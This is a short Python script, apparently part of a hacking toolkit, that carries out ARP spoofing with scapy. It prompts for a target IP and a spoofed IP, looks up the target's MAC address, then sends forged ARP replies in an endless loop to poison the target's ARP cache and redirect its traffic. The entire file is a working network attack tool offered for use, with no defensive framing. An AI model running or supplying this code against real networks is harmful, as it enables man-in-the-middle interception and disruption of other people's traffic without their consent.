from scapy.all import *
from os import system
def ArpSpoofingMainF():
    while 1:
        try:
            system("clear")
            print("""
             █████╗ ██████╗ ██████╗     ███████╗██████╗  ██████╗  ██████╗ ███████╗██╗███╗   ██╗ ██████╗
            ██╔══██╗██╔══██╗██╔══██╗    ██╔════╝██╔══██╗██╔═══██╗██╔═══██╗██╔════╝██║████╗  ██║██╔════╝
            ███████║██████╔╝██████╔╝    ███████╗██████╔╝██║   ██║██║   ██║█████╗  ██║██╔██╗ ██║██║  ███╗
            ██╔══██║██╔══██╗██╔═══╝     ╚════██║██╔═══╝ ██║   ██║██║   ██║██╔══╝  ██║██║╚██╗██║██║   ██║
            ██║  ██║██║  ██║██║         ███████║██║     ╚██████╔╝╚██████╔╝██║     ██║██║ ╚████║╚██████╔╝
            ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝         ╚══════╝╚═╝      ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═══╝ ╚═════╝                                                                                           """)
            target_ip=input("\n\nEnter the target ip : ")
            spoof_ip=input("\nEnter the spoof ip : ")
            packet = Ether(dst = "ff:ff:ff:ff:ff:ff")/ ARP(pdst = target_ip)
            result = srp(packet , verbose = 0)
            resMac=result[0][0][1].hwsrc
            print(resMac)
            while 1:
                target_mac = resMac
                packet = Ether(dst = target_mac) / ARP(psrc=spoof_ip , pdst=target_ip,hwdst = target_mac , op = "is-at")
                sendp(packet , verbose = 0)
                print("[*] Packet send !")
        except KeyboardInterrupt:
            break
